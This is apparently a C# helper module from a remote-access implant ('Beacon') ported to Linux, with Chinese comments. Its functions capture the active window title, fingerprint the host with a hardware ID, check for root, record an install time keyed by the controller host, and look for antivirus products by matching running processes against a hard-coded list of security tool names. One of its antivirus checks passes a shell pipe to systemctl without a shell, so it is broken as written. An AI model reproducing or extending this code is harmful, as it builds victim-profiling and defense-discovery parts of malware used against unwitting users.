using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime;
using System.Security.Cryptography;
using System.Text;
using static System.Net.Mime.MediaTypeNames;

namespace Beacon.Helper
{
    internal class Helper
    {
        /// <summary>
        /// 获取活动窗口标题 (Linux兼容版本)
        /// </summary>
        /// <returns></returns>
        public static string GetActiveWindowTitle()
        {
            try
            {
                // 在Linux上尝试获取活动窗口标题
                // 使用xdotool或类似工具
                var process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "xdotool",
                        Arguments = "getactivewindow getwindowname",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow = true
                    }
                };
                
                process.Start();
                string result = process.StandardOutput.ReadToEnd();
                process.WaitForExit();
                
                if (process.ExitCode == 0 && !string.IsNullOrEmpty(result))
                {
                    return result.Trim();
                }
            }
            catch 
            {
                // 如果xdotool不可用，尝试其他方法
                try
                {
                    // 尝试使用wmctrl
                    var process = new Process
                    {
                        StartInfo = new ProcessStartInfo
                        {
                            FileName = "wmctrl",
                            Arguments = "-a :ACTIVE: -v",
                            UseShellExecute = false,
                            RedirectStandardOutput = true,
                            CreateNoWindow = true
                        }
                    };
                    
                    process.Start();
                    string result = process.StandardOutput.ReadToEnd();
                    process.WaitForExit();
                    
                    if (process.ExitCode == 0 && !string.IsNullOrEmpty(result))
                    {
                        return result.Trim();
                    }
                }
                catch { }
            }
            return "Unknown Window";
        }
        /// <summary>
        /// 判断指定进程是否存在 (Linux兼容版本)
        /// </summary>
        /// <param name="processName"></param>
        /// <returns></returns>
        public static bool IsProcessExist(string processName)
        {
            // 移除.exe扩展名（如果存在）
            if (processName.EndsWith(".exe", System.StringComparison.OrdinalIgnoreCase))
                processName = processName.Substring(0, processName.Length - 4);

            try
            {
                // 在Linux上使用pgrep命令检查进程
                var process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "pgrep",
                        Arguments = $"-f {processName}",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow = true
                    }
                };
                
                process.Start();
                string result = process.StandardOutput.ReadToEnd();
                process.WaitForExit();
                
                return process.ExitCode == 0 && !string.IsNullOrEmpty(result.Trim());
            }
            catch
            {
                // 如果pgrep不可用，回退到.NET方法
                try
                {
                    return Process.GetProcesses()
                        .Any(p => string.Equals(p.ProcessName, processName, System.StringComparison.OrdinalIgnoreCase));
                }
                catch
                {
                    return false;
                }
            }
        }
        /// <summary>
        /// 获取安装时间 (Linux兼容版本)
        /// </summary>
        /// <returns></returns>
        public static string GetInstallationTime()
        {
            // 根据IP和端口生成唯一键名
            string keyName = $"InstallTime_{Settings.Hos_ts.Replace(".", "_").Replace(":", "_")}";

            try
            {
                // 使用文件存储替代注册表
                string existingTime = FileStorage.GetStringValue(keyName);

                if (!string.IsNullOrEmpty(existingTime))
                {
                    // 如果已存在，返回已有的时间
                    return existingTime;
                }
                else
                {
                    // 如果不存在，写入当前时间并返回
                    string currentTime = DateTime.Now.ToUniversalTime().ToString();
                    FileStorage.SetStringValue(keyName, currentTime);
                    return currentTime;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Helper] 获取安装时间失败: {ex.Message}");
                // 返回现在的时间
                return DateTime.Now.ToUniversalTime().ToString();
            }
        }
        /// <summary>
        /// 检查是否具有管理员权限 (Linux兼容版本)
        /// </summary>
        /// <returns></returns>
        public static bool IsAdmin()
        {
            try
            {
                // 在Linux上检查是否为root用户
                if (Environment.OSVersion.Platform == PlatformID.Unix)
                {
                    return Environment.UserName == "root";
                }
                
                // 对于其他平台，尝试检查用户ID
                var process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "id",
                        Arguments = "-u",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow = true
                    }
                };
                
                process.Start();
                string result = process.StandardOutput.ReadToEnd();
                process.WaitForExit();
                
                if (process.ExitCode == 0 && int.TryParse(result.Trim(), out int userId))
                {
                    return userId == 0; // root用户的ID是0
                }
            }
            catch
            {
                // 如果无法确定，假设不是管理员
            }
            
            return false;
        }
        public static string HWID()
        {
            try
            {
                string strToHash = string.Concat(Environment.ProcessorCount, Environment.UserName,
                    Environment.MachineName, Environment.OSVersion
                    , new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize);
                MD5CryptoServiceProvider md5Obj = new MD5CryptoServiceProvider();
                byte[] bytesToHash = Encoding.ASCII.GetBytes(strToHash);
                bytesToHash = md5Obj.ComputeHash(bytesToHash);
                StringBuilder strResult = new StringBuilder();
                foreach (byte b in bytesToHash)
                    strResult.Append(b.ToString("x2"));
                return strResult.ToString().Substring(0, 20).ToUpper();
            }
            catch
            {
                return "Err HWID";
            }
        }
        public static string ReverseString(string input)
        {
            if (string.IsNullOrEmpty(input))
                return input;

            char[] arr = input.ToCharArray();
            Array.Reverse(arr);
            return new string(arr);
        }
        /// <summary>
        /// 获取杀毒软件信息 (Linux兼容版本)
        /// </summary>
        /// <returns></returns>
        public static string Av()
        {
            try
            {
                string antivirusInfo = string.Empty;
                
                // 在Linux上检查常见的杀毒软件
                string[] commonAntivirus = {
                    "clamav", "clamd", "clamscan",
                    "sophos", "sav",
                    "kaspersky", "kav",
                    "norton", "nav",
                    "mcafee", "uvscan",
                    "avast", "avastd",
                    "avg", "avgd",
                    "bitdefender", "bdscan",
                    "eset", "nod32",
                    "f-prot", "fpscan",
                    "trend", "tmas",
                    "symantec", "symantec_antivirus"
                };

                foreach (string av in commonAntivirus)
                {
                    if (IsProcessExist(av))
                    {
                        antivirusInfo += av + "; ";
                    }
                }

                // 检查系统服务
                try
                {
                    var process = new Process
                    {
                        StartInfo = new ProcessStartInfo
                        {
                            FileName = "systemctl",
                            Arguments = "list-units --type=service | grep -i antivirus",
                            UseShellExecute = false,
                            RedirectStandardOutput = true,
                            CreateNoWindow = true
                        }
                    };
                    
                    process.Start();
                    string result = process.StandardOutput.ReadToEnd();
                    process.WaitForExit();
                    
                    if (process.ExitCode == 0 && !string.IsNullOrEmpty(result))
                    {
                        antivirusInfo += "System Service: " + result.Trim() + "; ";
                    }
                }
                catch { }

                antivirusInfo = RemoveLastChars(antivirusInfo);
                return (!string.IsNullOrEmpty(antivirusInfo)) ? antivirusInfo : "N/A";
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Helper] 获取杀毒软件信息失败: {ex.Message}");
                return "Unknown";
            }
        }
        public static string RemoveLastChars(string input, int amount = 2)
        {
            if (input.Length > amount)
                input = input.Remove(input.Length - amount);
            return input;
        }


    }
}
